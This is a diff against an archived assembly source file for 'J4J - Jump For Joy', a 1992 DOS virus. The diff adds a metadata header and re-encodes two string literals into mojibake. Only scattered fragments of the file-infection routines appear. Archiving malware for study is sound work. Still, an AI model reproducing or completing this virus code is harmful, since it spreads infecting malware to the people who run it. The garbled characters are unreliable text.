@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      F
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;J4J - Jump For Joy, released 31 Jan 92, (c) Charlie of Demoralized Youth
 ;------------------------------------------------------------------------
 ;This source has been lying around for a veeeeeery long time, and I will
@@ -214,7 +225,7 @@ repl2:  push    bp
 repl3:
 
 
-db 'Elo‹, Elo‹, lam  sabakt ni?'
+db 'Eloï¿½, Eloï¿½, lamï¿½ sabaktï¿½ni?'
 
 file_main:
 pushf
@@ -406,7 +417,7 @@ file_info_set:
         call    int21
         ret
 
-db '¨­¨--?!?'
+db 'ï¿½ï¿½ï¿½--?!?'
 
 mekke_fil:
         cmp [f_size],1023
